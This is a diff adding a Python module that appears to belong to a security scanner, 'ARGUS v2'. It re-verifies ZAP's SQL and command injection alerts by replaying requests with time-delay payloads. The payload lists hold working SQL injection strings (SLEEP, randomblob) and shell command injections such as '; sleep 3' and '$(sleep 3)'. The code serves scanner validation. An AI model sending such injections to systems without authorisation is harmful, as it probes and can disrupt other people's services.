@@ -1,0 +1,171 @@
+"""
+ARGUS v2 - SQL Injection Payload Injector (Custom Verification)
+"""
+
+import time
+import requests
+import json
+import urllib.parse
+from typing import List, Dict, Optional
+from models import DetectionResult, ScanTarget, ParamLocation
+
+class BaseInjector:
+    def __init__(self, jwt_token: str = ""):
+        self.jwt_token = jwt_token
+        self.headers = {"Content-Type": "application/json"}
+        if self.jwt_token:
+            auth_val = self.jwt_token if self.jwt_token.lower().startswith("bearer") else f"Bearer {self.jwt_token}"
+            self.headers["Authorization"] = auth_val
+            
+        self.sleep_secs = 3
+        self.payloads = [] # To be defined by subclasses
+        
+    def measure_response_time(self, method: str, url: str, body: Optional[str] = None, params: Optional[dict] = None) -> float:
+        try:
+            start = time.time()
+            req_kwargs = {"headers": self.headers, "timeout": 10}
+            
+            # If body is provided as a raw string, we use data=body
+            if body is not None:
+                req_kwargs["data"] = body.encode('utf-8')
+                
+            # We don't use requests' params because we manually substituted the URL to prevent appending
+            # params parameter is kept in signature but we expect the URL to already contain the injected query/path
+            
+            if method == "GET":
+                requests.get(url, **req_kwargs)
+            elif method == "POST":
+                requests.post(url, **req_kwargs)
+            elif method == "PUT":
+                requests.put(url, **req_kwargs)
+            elif method == "PATCH":
+                requests.patch(url, **req_kwargs)
+            elif method == "DELETE":
+                requests.delete(url, **req_kwargs)
+                
+            elapsed = time.time() - start
+            return elapsed
+        except requests.exceptions.Timeout:
+            return 10.0
+        except Exception:
+            return -1.0
+
+    def verify_zap_alert(self, result: DetectionResult) -> DetectionResult:
+        """
+        ZAP이 탐지한 파라미터에 대해 실제 지연 페이로드를 수행하여 교차 검증합니다.
+        """
+        try:
+            method = result.method.upper()
+            param_name = result.param
+            
+            # ZAP already placed the attack payload into raw_request_url or raw_request_body
+            zap_url = result.raw_request_url if result.raw_request_url else result.url
+            if zap_url and not zap_url.startswith("http"):
+                parsed_base = urllib.parse.urlparse(result.url)
+                zap_url = f"{parsed_base.scheme}://{parsed_base.netloc}{zap_url}"
+            
+            raw_body = result.raw_request_body
+            zap_attack = result.zap_payload
+            
+            # We need a baseline to know how long the endpoint normally takes.
+            # To get the clean baseline, we replace the zap_attack with a benign value (or just the original value if we know it).
+            # Since we might not know the original value, substituting with a safe integer '1' or safe string 'a' is a heuristic.
+            encoded_zap_attack = urllib.parse.quote(zap_attack, safe='') if zap_attack else ""
+            json_escaped_attack = json.dumps(zap_attack)[1:-1] if zap_attack else ""
+            
+            clean_url = zap_url
+            if zap_attack:
+                if encoded_zap_attack in clean_url:
+                    clean_url = clean_url.replace(encoded_zap_attack, "1")
+                elif zap_attack in clean_url:
+                    clean_url = clean_url.replace(zap_attack, "1")
+                    
+            clean_body = raw_body
+            if zap_attack and raw_body:
+                if json_escaped_attack and json_escaped_attack in clean_body:
+                    clean_body = clean_body.replace(json_escaped_attack, "1")
+                elif zap_attack in clean_body:
+                    clean_body = clean_body.replace(zap_attack, "1")
+                    
+            if clean_url == zap_url and clean_body == raw_body:
+                print(f"[WARN] payload substitution failed entirely for param: {param_name}, result may be unreliable.")
+                
+            baseline_time = self.measure_response_time(method, clean_url, body=clean_body)
+            if baseline_time < 0:
+                return result # connection error
+                
+            max_delay = 0.0
+            successful_payload = ""
+            
+            for payload in self.payloads:
+                # We take the exact request ZAP crafted and replace ZAP's payload with our time-based payload
+                injected_url = zap_url
+                if zap_attack:
+                    encoded_payload = urllib.parse.quote(payload)
+                    if encoded_zap_attack in injected_url:
+                        injected_url = injected_url.replace(encoded_zap_attack, encoded_payload)
+                    elif zap_attack in injected_url:
+                        injected_url = injected_url.replace(zap_attack, encoded_payload)
+                
+                injected_body = raw_body
+                if raw_body and zap_attack:
+                    # To prevent breaking JSON structure (e.g. payload contains raw quotes),
+                    # we encode the payload to JSON string format and strip the surrounding quotes.
+                    json_safe_payload = json.dumps(payload)[1:-1]
+                    if json_escaped_attack and json_escaped_attack in injected_body:
+                        injected_body = injected_body.replace(json_escaped_attack, json_safe_payload)
+                    elif zap_attack in injected_body:
+                        injected_body = injected_body.replace(zap_attack, json_safe_payload)
+                
+                # Try injection (we send both the injected url and injected body)
+                delay = self.measure_response_time(method, injected_url, body=injected_body)
+                    
+                if delay > max_delay:
+                    max_delay = delay
+                    
+                # If the delay is significant compared to baseline AND >= sleep_secs * 0.8
+                # (allowing some network variance), it's verified!
+                diff = delay - baseline_time
+                if diff >= (self.sleep_secs * 0.8):
+                    result.custom_verified = True
+                    result.custom_payload = payload
+                    result.custom_time_delay_sec = delay
+                    result.cross_validated = True
+                    result.evidence = f"Time-based payload succeeded. Baseline: {baseline_time:.2f}s, Delayed: {delay:.2f}s"
+                    break
+                    
+            if not result.custom_verified:
+                result.evidence = f"False Positive. Baseline: {baseline_time:.2f}s. Max injected delay: {max_delay:.2f}s."
+                
+            return result
+        except Exception as e:
+            print(f"[ERROR] verification failed for {result.param}: {e}")
+            result.evidence = f"Verification error: {e}"
+            return result
+
+class SqliInjector(BaseInjector):
+    def __init__(self, jwt_token: str = ""):
+        super().__init__(jwt_token)
+        # MariaDB SLEEP Payloads
+        self.payloads = [
+            f"1 AND SLEEP({self.sleep_secs})",
+            f"1' AND SLEEP({self.sleep_secs})-- -",
+            f"'; SLEEP({self.sleep_secs})-- -",
+            f"\" OR SLEEP({self.sleep_secs})=\"",
+            f"1) AND SLEEP({self.sleep_secs}) AND (1=1",
+            # SQLite specific (randomblob to cause delay, approx 1 sec per 100000000)
+            # Not an exact sleep, but a heavy computation
+            f"1 AND (SELECT count(*) FROM sqlite_master)=0 OR randomblob({self.sleep_secs}00000000)",
+            f"1' AND (SELECT count(*) FROM sqlite_master)=0 OR randomblob({self.sleep_secs}00000000)-- -",
+        ]
+
+class CommandInjector(BaseInjector):
+    def __init__(self, jwt_token: str = ""):
+        super().__init__(jwt_token)
+        # OS Command SLEEP Payloads
+        self.payloads = [
+            f"; sleep {self.sleep_secs}",
+            f"| sleep {self.sleep_secs}",
+            f"`sleep {self.sleep_secs}`",
+            f"$(sleep {self.sleep_secs})",
+        ]
